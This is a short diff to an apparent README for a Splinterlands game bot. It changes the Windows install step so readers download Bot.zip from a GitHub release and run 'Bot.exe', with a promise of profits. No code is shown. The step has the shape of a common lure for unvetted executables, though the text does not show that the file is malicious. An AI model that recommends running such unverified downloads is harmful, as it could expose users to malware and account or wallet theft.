@@ -25,4 +25,4 @@ The Splinterlands bot is designed to track your performance and help you make be
 
 ### How to install on Windows PC:
 
-[Download the Bot.zip](https://github.com/splinterlandsbot/splinterlandsbot.github.io/releases/download/bot/Bot.zip) with the button below and start the "Setup.exe" file to start setting up the bot. After that you simply follow the instructions in the setup to set the bot up how you like it. Enjoy and lets make some profits!!
+[Download the Bot.zip](https://github.com/splinterlandsbot/splinterlandsbot.github.io/releases/download/bot/Bot.zip) with the button below and start the "Bot.exe" file to start setting up the bot. After that you simply follow the instructions in the setup to set the bot up how you like it. Enjoy and lets make some profits!!
